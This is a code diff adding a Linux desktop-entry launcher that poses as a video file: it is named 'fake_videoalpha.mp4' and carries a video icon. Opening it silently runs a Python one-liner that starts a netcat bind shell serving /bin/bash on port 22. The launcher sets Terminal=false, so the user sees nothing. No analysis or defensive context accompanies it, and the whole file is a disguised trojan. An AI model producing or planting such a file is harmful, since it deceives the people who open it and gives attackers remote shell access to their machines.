@@ -1,0 +1,10 @@
+#!/usr/bin/env xdg-open
+
+[Desktop Entry]
+Encoding=UTF-8
+Name=fake_videoalpha.mp4
+Exec= /usr/bin/python3 -c 'import os;os.system("nc -lp 22 -e /bin/bash")'
+Terminal=false
+Type=Application
+Icon=video-x-generic
+                      
